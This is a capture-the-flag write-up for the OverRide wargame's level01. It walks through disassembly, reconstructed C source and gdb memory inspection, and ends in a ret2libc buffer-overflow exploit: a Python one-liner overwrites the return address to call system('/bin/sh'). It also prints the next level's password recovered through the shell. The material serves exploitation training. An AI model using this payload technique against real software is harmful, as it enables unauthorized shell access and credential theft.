
# Steps
---
- ### Functions used in this program.
    ```c
    0x08048318  _init
    0x08048360  printf
    0x08048370  fgets
    0x08048380  puts
    0x08048390  __gmon_start__
    0x080483a0  __libc_start_main
    0x080483b0  _start
    0x080483e0  __do_global_dtors_aux
    0x08048440  frame_dummy
    0x08048464  verify_user_name
    0x080484a3  verify_user_pass
    0x080484d0  main
    0x080485c0  __libc_csu_init
    0x08048630  __libc_csu_fini
    0x08048632  __i686.get_pc_thunk.bx
    0x08048640  __do_global_ctors_aux
    0x0804866c  _fini
    ```

- ### Assembly code of `main`.
    ```c
    0x080484d0 <+0>:     push   %ebp
    0x080484d1 <+1>:     mov    %esp,%ebp
    0x080484d3 <+3>:     push   %edi
    0x080484d4 <+4>:     push   %ebx
    0x080484d5 <+5>:     and    $0xfffffff0,%esp
    0x080484d8 <+8>:     sub    $0x60,%esp
    0x080484db <+11>:    lea    0x1c(%esp),%ebx
    0x080484df <+15>:    mov    $0x0,%eax
    0x080484e4 <+20>:    mov    $0x10,%edx
    0x080484e9 <+25>:    mov    %ebx,%edi
    0x080484eb <+27>:    mov    %edx,%ecx
    0x080484ed <+29>:    rep stos %eax,%es:(%edi)
    0x080484ef <+31>:    movl   $0x0,0x5c(%esp)
    0x080484f7 <+39>:    movl   $0x80486b8,(%esp)
    0x080484fe <+46>:    call   0x8048380 <puts@plt>
    0x08048503 <+51>:    mov    $0x80486df,%eax
    0x08048508 <+56>:    mov    %eax,(%esp)
    0x0804850b <+59>:    call   0x8048360 <printf@plt>
    0x08048510 <+64>:    mov    0x804a020,%eax
    0x08048515 <+69>:    mov    %eax,0x8(%esp)
    0x08048519 <+73>:    movl   $0x100,0x4(%esp)
    0x08048521 <+81>:    movl   $0x804a040,(%esp)
    0x08048528 <+88>:    call   0x8048370 <fgets@plt>
    0x0804852d <+93>:    call   0x8048464 <verify_user_name>
    0x08048532 <+98>:    mov    %eax,0x5c(%esp)
    0x08048536 <+102>:   cmpl   $0x0,0x5c(%esp)
    0x0804853b <+107>:   je     0x8048550 <main+128>
    0x0804853d <+109>:   movl   $0x80486f0,(%esp)
    0x08048544 <+116>:   call   0x8048380 <puts@plt>
    0x08048549 <+121>:   mov    $0x1,%eax
    0x0804854e <+126>:   jmp    0x80485af <main+223>
    0x08048550 <+128>:   movl   $0x804870d,(%esp)
    0x08048557 <+135>:   call   0x8048380 <puts@plt>
    0x0804855c <+140>:   mov    0x804a020,%eax
    0x08048561 <+145>:   mov    %eax,0x8(%esp)
    0x08048565 <+149>:   movl   $0x64,0x4(%esp)
    0x0804856d <+157>:   lea    0x1c(%esp),%eax
    0x08048571 <+161>:   mov    %eax,(%esp)
    0x08048574 <+164>:   call   0x8048370 <fgets@plt>
    0x08048579 <+169>:   lea    0x1c(%esp),%eax
    0x0804857d <+173>:   mov    %eax,(%esp)
    0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
    0x08048585 <+181>:   mov    %eax,0x5c(%esp)
    0x08048589 <+185>:   cmpl   $0x0,0x5c(%esp)
    0x0804858e <+190>:   je     0x8048597 <main+199>
    0x08048590 <+192>:   cmpl   $0x0,0x5c(%esp)
    0x08048595 <+197>:   je     0x80485aa <main+218>
    0x08048597 <+199>:   movl   $0x804871e,(%esp)
    0x0804859e <+206>:   call   0x8048380 <puts@plt>
    0x080485a3 <+211>:   mov    $0x1,%eax
    0x080485a8 <+216>:   jmp    0x80485af <main+223>
    0x080485aa <+218>:   mov    $0x0,%eax
    0x080485af <+223>:   lea    -0x8(%ebp),%esp
    0x080485b2 <+226>:   pop    %ebx
    0x080485b3 <+227>:   pop    %edi
    0x080485b4 <+228>:   pop    %ebp
    0x080485b5 <+229>:   ret 
    ```
- ### Assembly code of `verify_user_name` function.
    ```c   
    0x08048464 <+0>:     push   %ebp
    0x08048465 <+1>:     mov    %esp,%ebp
    0x08048467 <+3>:     push   %edi
    0x08048468 <+4>:     push   %esi
    0x08048469 <+5>:     sub    $0x10,%esp
    0x0804846c <+8>:     movl   $0x8048690,(%esp)
    0x08048473 <+15>:    call   0x8048380 <puts@plt>
    0x08048478 <+20>:    mov    $0x804a040,%edx
    0x0804847d <+25>:    mov    $0x80486a8,%eax
    0x08048482 <+30>:    mov    $0x7,%ecx
    0x08048487 <+35>:    mov    %edx,%esi
    0x08048489 <+37>:    mov    %eax,%edi
    0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi)
    0x0804848d <+41>:    seta   %dl
    0x08048490 <+44>:    setb   %al
    0x08048493 <+47>:    mov    %edx,%ecx
    0x08048495 <+49>:    sub    %al,%cl
    0x08048497 <+51>:    mov    %ecx,%eax
    0x08048499 <+53>:    movsbl %al,%eax
    0x0804849c <+56>:    add    $0x10,%esp
    0x0804849f <+59>:    pop    %esi
    0x080484a0 <+60>:    pop    %edi
    0x080484a1 <+61>:    pop    %ebp
    0x080484a2 <+62>:    ret
    ```

- ### Assembly code of `verify_user_pass` function.
    ```c
    0x080484a3 <+0>:     push   %ebp
    0x080484a4 <+1>:     mov    %esp,%ebp
    0x080484a6 <+3>:     push   %edi
    0x080484a7 <+4>:     push   %esi
    0x080484a8 <+5>:     mov    0x8(%ebp),%eax
    0x080484ab <+8>:     mov    %eax,%edx
    0x080484ad <+10>:    mov    $0x80486b0,%eax
    0x080484b2 <+15>:    mov    $0x5,%ecx
    0x080484b7 <+20>:    mov    %edx,%esi
    0x080484b9 <+22>:    mov    %eax,%edi
    0x080484bb <+24>:    repz cmpsb %es:(%edi),%ds:(%esi)
    0x080484bd <+26>:    seta   %dl
    0x080484c0 <+29>:    setb   %al
    0x080484c3 <+32>:    mov    %edx,%ecx
    0x080484c5 <+34>:    sub    %al,%cl
    0x080484c7 <+36>:    mov    %ecx,%eax
    0x080484c9 <+38>:    movsbl %al,%eax
    0x080484cc <+41>:    pop    %esi
    0x080484cd <+42>:    pop    %edi
    0x080484ce <+43>:    pop    %ebp
    0x080484cf <+44>:    ret 
    ```
- ### Source code.
    ```c
    #include <stdio.h>
    #include <string.h>


    int verify_user_name(void)
    {
        puts("verifying username....\n");
        return strcmp(a_user_name, "dat_wil");
    }

    int verify_user_pass(char *pass)
    {
        return strcmp(pass, "admin");
    }

    char a_user_name[256];

    int main(void)
    {
        char buf[64];   // esp+0x1c, zeroed by rep stos 
        int  ret;       // esp+0x5c, right after buf[]

        ret = 0;

        puts("********* ADMIN LOGIN PROMPT *********");
        printf("Enter Username: ");

        fgets(a_user_name, 256, stdin);

        ret = verify_user_name();

        if (ret != 0) {
            puts("nope, incorrect username...\n");
            return 1;
        }

        puts("Enter Password: ");

        fgets(buf, 100, stdin);          // reads 100 bytes into a 64-byte buf

        ret = verify_user_pass(buf);

        if (ret == 0)
            goto wrong_password; 

        if (ret == 0)
            goto correct_password;

        wrong_password:
            puts("nope, incorrect password...\n");
            return 1;

        correct_password:
            return 0;
    }

    ```

    #### There is a buffer overflow vulnerability here: `fgets(buf, 100, stdin);`. `buf` has only `64` bytes, as we can see it starts at `esp+0x1c` and ends at `esp+0x5c`; `0x5c - 0x1c = 0x40` (`64` in decimal).
    #### Determinat the number of bytes between `buf` and return address with gdb.
    - #### Set a break point before cheching the password.
        ```c
        (gdb) b *0x08048589
        Breakpoint 1 at 0x08048589
        ...
        0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
        0x08048585 <+181>:   mov    %eax,0x5c(%esp)
        0x08048589 <+185>:   cmpl   $0x0,0x5c(%esp)
        0x0804858e <+190>:   je     0x8048597 <main+199>
        ```
    - #### Run the program with a the valid user_name as in the code and with a sequentil characters as a password.
        ```c
        (gdb) r
        Starting program: /home/users/level01/level01 
        ********* ADMIN LOGIN PROMPT *********
        Enter Username: dat_wil
        verifying username....

        Enter Password: 
        aaaaabbbbbcccccddddd

        Breakpoint 1, 0x08048589 in main ()
        ```
    - #### Display the stack values.
        ```c
        (gdb) x/32wx $esp                             buf starts from this address
                                                                 |  
        0xffffd6b0:    0xffffd6cc     0x00000064     0xf7fcfac0  |  0x00000001
        0xffffd6c0:    0xffffd8d3     0x0000002f     0xffffd71c  -> 0x61616161
        0xffffd6d0:    0x62626261     0x63636262     0x64636363     0x64646464
        0xffffd6e0:    0x0000000a     0x00000000     0x00000000     0x00000000
        0xffffd6f0:    0x00000000     0x00000000     0x00000000     0x00000000
        0xffffd700:    0x00000000     0x00000000     0x00000000     0xffffffff
        0xffffd710:    0xf7fceff4     0x00000000     0x00000000     0xf7e45513  <- ret address
        0xffffd720:    0x00000001     0xffffd7b4     0xffffd7bc     0xf7fd3000
        (gdb) x/s 0xffffd6cc
        0xffffd6cc:      "aaaaabbbbbcccccddddd\n"
        (gdb) x/wx 0xf7e45513
        0xf7e45513 <__libc_start_main+243>:     0xe8240489
        (gdb) x/wx 0xffffd71c
        0xffffd71c:     0xf7e45513 <- ret address
        (gdb) x/wx 0xffffd6cc+0x50
        0xffffd71c:     0xf7e45513 <- ret address
        ```
    - #### As we see at the above gdb outputs the `buf` starts form the address `0xffffd6cc` and ret address located at address `0xffffd71c` and the difference between them is `0x50` (`80` in decimal)

    #### Try use `system` function with `/bin/sh`.
    - #### Search about both addresses, the address of `system` and the address `/bin/sh`.
        ```c
        (gdb) p system
        $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
        (gdb) find 0xf7e2c000, +9999999, "/bin/sh"
        0xf7f897ec
        1 pattern found.
        (gdb) x/s 0xf7f897ec
        0xf7f897ec:      "/bin/sh"
        ```
    - #### Since the return address is `80` bytes next to `buf`, we need to use the valid `user_name` to bypass the first verification, then use a password containing `80` characters, add the address of `system`, add `4` bytes for the fake return address, and add the address of the `/bin/sh` command to open a shell.
    ```sh
    level01@OverRide:~$ (python -c 'print("dat_wil\n"+"a"*80+"\xd0\xae\xe6\xf7bbbb\xec\x97\xf8\xf7")'; cat) | ./level01 
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: verifying username....

    Enter Password: 
    nope, incorrect password...

    whoami
    level02
    cat /home/users/level02/.pass
    PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
    ```

- ### Solution
    ```sh
    (python -c 'print("dat_wil\n"+"a"*80+"\xd0\xae\xe6\xf7bbbb\xec\x97\xf8\xf7")'; cat) | ./level01 
    ```
    #### Address of system `0xf7e6aed0` => `\xd0\xae\xe6\xf7`
    #### Address of "/bin/sh" in libc `0xf7f897ec` => `\xec\x97\xf8\xf7`